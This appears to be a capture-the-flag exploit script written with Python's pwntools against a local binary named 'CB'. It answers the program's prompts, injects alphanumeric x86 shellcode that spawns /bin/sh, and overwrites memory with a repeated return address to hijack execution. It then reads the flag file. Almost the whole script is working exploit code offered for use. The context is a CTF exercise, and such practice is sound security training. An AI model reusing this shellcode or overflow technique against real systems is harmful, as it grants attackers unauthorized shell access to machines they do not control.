from pwn import *

context.log_level='debug'
s=process('./CB')

shellcode="\x52\x5e\x6A\x31\x58\x34\x31\x50\x5a\x50\x68\x2F\x2F"
shellcode+="\x73\x68\x68\x2F\x62\x69\x6E\x54\x5B"
shellcode+="\x50\x53\x54\x59\x6A\x38\x58\x34\x33"
shellcode+="\x50\x5F\x68\x30\x41\x47\x47\x58\x66"
shellcode+="\x35\x30\x41\x66\x48\x66\x35\x41\x30"
shellcode+="\x66\x35\x73\x4F\x50\x57"   
shellcode+="\x66\x31\x45\x3c\x58"

raw_input('!')

s.recvuntil('?')
s.sendline('Y')

s.recvuntil(': ')
s.sendline('20020212')

s.send(shellcode)

ex=p32(0x804a080)*(1024/4)

s.sendline(ex)

sleep(1)

s.sendline('cat ./flag')

s.recv(1024)
print "flag: "+s.recv(1024)
